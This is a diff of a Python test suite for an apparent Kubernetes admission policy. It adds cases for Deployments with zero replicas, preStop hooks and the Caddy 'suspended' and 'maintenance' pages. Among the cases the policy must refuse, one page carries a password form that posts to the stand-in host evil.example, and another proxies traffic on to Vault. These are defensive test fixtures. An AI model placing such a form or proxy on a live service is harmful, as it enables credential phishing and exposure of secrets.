@@ -102,6 +102,8 @@ def finish():
     # What the real apply produced, for the test's own checks.
     summary = {
         "deployments": sorted(o["metadata"]["name"] for o in objects if o["kind"] == "Deployment"),
+        # A suspended App's Deployment runs 0 replicas, so it has no pod.
+        "replicas": sum(o["spec"].get("replicas", 1) for o in objects if o["kind"] == "Deployment"),
         "pods": sorted(o["metadata"]["labels"].get("cloud.viktorbarzin.me/service", "") + "/" + o["metadata"]["labels"].get(COMPONENT, "") for o in objects if o["kind"] == "Pod"),
         "kinds": sorted({o["kind"] for o in objects}),
     }
@@ -337,6 +339,23 @@ for name, change, expect in EDGE_RULES:
     case(f"edge-{name}", "kr", expect, f"edge Deployment with {name}", variant(edge, lambda o, ch=change: ch(spec_of(o))))
 case("edge-pod-port-9090", "ka", E_PORT, "edge pod with port edge = 9090", variant(as_pod(edge, "edge-9090"), lambda o: ec(spec_of(o))["ports"][0].update({"containerPort": 9090})))
 case("app-as-edge", "kr", "only an App pod may have an init container|" + E_ONE, "App Deployment labelled component=edge", variant(app, relabel("edge")))
+# Replicas (the cloud repo's B06): a suspended App runs 0 replicas, and only
+# an App may; its edge and oauth2-proxy always run, so its address answers.
+E_REPLICAS = "only an App Deployment may run 0 replicas"
+case("app-zero-replicas", "kr", "ok", "App Deployment with 0 replicas (a suspended App)",
+     variant(app, lambda o: o["spec"].update({"replicas": 0})))
+case("edge-zero-replicas", "kr", E_REPLICAS, "edge Deployment with 0 replicas",
+     variant(edge, lambda o: o["spec"].update({"replicas": 0})))
+case("auth-zero-replicas", "kr", E_REPLICAS, "oauth2-proxy Deployment with 0 replicas",
+     variant(proxy, lambda o: o["spec"].update({"replicas": 0})))
+# The App's preStop delay (B06): Cloud renders exec sleep 5 (the rendered
+# App Deployment above); the native sleep action passes too, for when the
+# provider renders it. The edge may have no hook at all (edge-poststart).
+assert app_c(spec_of(app)).get("lifecycle", {}).get("preStop", {}).get("exec", {}).get("command") == ["sleep", "5"], "the App's preStop sleep"
+case("app-prestop-sleep-action", "kr", "ok", "App Deployment with a preStop sleep action of 5 s",
+     variant(app, lambda o: app_c(spec_of(o)).update({"lifecycle": {"preStop": {"sleep": {"seconds": 5}}}})))
+case("edge-prestop-sleep", "kr", E_RUNS, "edge Deployment with a preStop sleep action",
+     variant(edge, lambda o: ec(spec_of(o)).update({"lifecycle": {"preStop": {"sleep": {"seconds": 5}}}})))
 # The edge from before app-kit K1, without the edge secret (two env values),
 # is refused.
 case("edge-v1-env", "kr", E_RUNS, "edge Deployment without CLOUD_EDGE_SECRET, as before app-kit K1",
@@ -601,6 +620,36 @@ V1_CADDYFILE = """{
 }
 """ % (target, COOKIE_LIST)
 case("edge-cm-v1", "kr", RENDERED, "the Caddyfile before app-kit K1", variant(public_cf, lambda o: o["data"].update({CADDY: V1_CADDYFILE})))
+
+# A suspended App and an App in maintenance (the cloud repo's B06): the edge
+# answers every request 503 with a fixed page and proxies nothing. The pages
+# are local.cloud_edge_pages in stacks/cloud/access_rules.tf, the same text
+# as the cloud repo's modules/app/edge.tf. Cloud's snapshot fixtures "a
+# suspended App" and "an App in maintenance" apply the real ones below.
+PAGES = {
+    "suspended": "<!doctype html><html lang=en><meta charset=utf-8><title>Suspended</title><h1>This App is suspended</h1><p>Its owner has stopped it for now. Try again later.</p></html>",
+    "maintenance": "<!doctype html><html lang=en><meta charset=utf-8><title>Maintenance</title><h1>This App is down for maintenance</h1><p>Try again in a few minutes.</p></html>",
+}
+CADDY_HEAD = public_cf["data"][CADDY].split("\troute {\n")[0]
+
+
+def page_cf(page, body=None, status="503", extra=""):
+    return CADDY_HEAD + "\troute {\n\t\theader Content-Type text/html;charset=utf-8\n\t\theader Cache-Control no-store\n\t\trespond `" + (body or PAGES[page]) + "` " + status + "\n" + extra + "\t}\n}\n"
+
+
+for page in PAGES:
+    case(f"edge-cm-page-{page}", "kr", "ok", f"the {page} page: no upstream, no cookie line",
+         variant(public_cf, lambda o, p=page: o["data"].update({CADDY: page_cf(p)})))
+case("edge-cm-page-upstream", "kr", RENDERED, "the suspended page with a proxy to Vault after it",
+     variant(public_cf, lambda o: o["data"].update({CADDY: page_cf("suspended", extra="\t\treverse_proxy vault-active.vault.svc.cluster.local:8200\n")})))
+case("edge-cm-page-app", "kr", RENDERED, "the maintenance page with a proxy to the App after it",
+     variant(public_cf, lambda o: o["data"].update({CADDY: page_cf("maintenance", extra=f"\t\treverse_proxy app-menu.{target}.svc.cluster.local:80\n")})))
+case("edge-cm-page-text", "kr", RENDERED, "a page with other text (a sign-in form on the App's host)",
+     variant(public_cf, lambda o: o["data"].update({CADDY: page_cf("suspended", body="<form action=https://evil.example><input name=password></form>")})))
+case("edge-cm-page-200", "kr", RENDERED, "the suspended page answered 200",
+     variant(public_cf, lambda o: o["data"].update({CADDY: page_cf("suspended", status="200")})))
+case("edge-cm-page-site", "kr", RENDERED, "the maintenance page with a second site block",
+     variant(public_cf, lambda o: o["data"].update({CADDY: page_cf("maintenance") + ":8081 {\n\treverse_proxy app-menu:80\n}\n"})))
 
 # --- ResourceQuota and LimitRange -------------------------------------------------------
 quota = one("ResourceQuota", "cloud-quota")
